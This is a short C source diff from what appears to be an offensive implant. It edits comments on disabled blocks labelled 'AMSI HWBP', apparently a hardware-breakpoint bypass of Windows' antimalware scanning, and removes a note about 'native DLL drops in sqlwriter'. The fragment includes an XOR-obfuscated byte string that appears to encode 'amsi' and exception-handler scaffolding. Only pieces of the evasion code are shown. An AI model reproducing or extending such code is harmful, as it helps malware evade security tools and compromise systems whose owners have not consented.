@@ -271,7 +271,7 @@ void dc_path_expand(char *path, int cap, cff_expand_fn fExpand) {
   path[n - 1] = 0;
 }
 
-#if 0 /* AMSI HWBP: disabled — AMSI does not scan native DLL drops in sqlwriter */
+#if 0 /* AMSI HWBP: disabled */
 static void *g_bp_tgt;
 static int g_veh_reg;
 
@@ -333,7 +333,7 @@ static HMODULE get_ntdll(void) {
 }
 #endif
 
-#if 0 /* AMSI HWBP: see block above */
+#if 0 /* AMSI HWBP */
 static void bp_arm(void) {
   unsigned char e_amsi[] = {0x58, 0x55, 0x40, 0x5b, 0x49, 0x02, 0x5e, 0x0e};
 
